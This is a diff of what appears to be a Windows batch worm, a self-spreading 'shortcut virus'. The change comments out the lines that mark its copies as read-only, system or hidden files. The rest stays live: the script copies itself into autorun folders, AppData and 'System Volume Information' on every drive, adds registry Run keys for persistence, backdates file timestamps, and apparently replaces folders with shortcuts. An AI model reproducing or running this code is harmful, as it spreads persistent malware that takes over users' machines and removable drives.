@@ -78,7 +78,7 @@ if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg 
 
 
 
-attrib +r +s "%~dpnx0"
+rem attrib +r +s "%~dpnx0"
 %module_fileTouch% /w /a /c /d %app_date% "%~dpnx0"
 
 
@@ -107,13 +107,13 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 if exist "%path_autoRun1%\%~nx0" (
   copy /y "%~dpnx0" "%path_autoRun1%\"
-  attrib +r +s "%path_autoRun1%\%~nx0"
+  rem attrib +r +s "%path_autoRun1%\%~nx0"
   %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun1%\%~nx0"
 )
 
 if not exist "%path_autoRun2%\%~nx0" (
   copy /y "%~dpnx0" "%path_autoRun2%\"
-  attrib +r +s "%path_autoRun2%\%~nx0"
+  rem attrib +r +s "%path_autoRun2%\%~nx0"
   %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun2%\%~nx0"
 )
 
@@ -123,7 +123,7 @@ if not exist "%path_autoRun2%\%~nx0" (
 
 for %%i in (localAppData appData) do (
   if exist "!%%i!\%~nx0" (
-    call attrib +r +s "!%%i!\%~nx0"
+    rem call attrib +r +s "!%%i!\%~nx0"
     (
       call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
       call reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /ff
@@ -134,7 +134,7 @@ for %%i in (localAppData appData) do (
     )>nul 2>nul
   ) else (
     call copy /y "%~dpnx0" "!%%i!\"
-    if exist "!%%i!\%~nx0" call attrib +r +s "!%%i!\%~nx0"
+    rem if exist "!%%i!\%~nx0" call attrib +r +s "!%%i!\%~nx0"
   )
 )
 
@@ -146,9 +146,9 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
   for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
     if /i "%%j" == "System Volume Information" if not exist "%%i:\%%j\%~nx0" (
       copy /y "%~dpnx0" "%%i:\%%j\"
-      if exist "%%i:\%%j\%~nx0" attrib +r +s "%%i:\%%j\%~nx0"
+      rem if exist "%%i:\%%j\%~nx0" attrib +r +s "%%i:\%%j\%~nx0"
     ) else (
-      attrib +r +s "%%i:\%%j\%~nx0"
+      rem attrib +r +s "%%i:\%%j\%~nx0"
       (
         %module_fileTouch% /w /a /c /d %app_date% "%%i:\%%j\%~nx0"
         reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
@@ -160,7 +160,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
     )
 
     if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
-      attrib +h +s "%%i:\%%j"
+      rem attrib +h +s "%%i:\%%j"
       if not exist "%%i:\%%j.lnk" (
         set counter=0
         for /f "delims=" %%y in ('dir "%%i:\%%j\*" /b 2^>nul') do set /a counter+=1
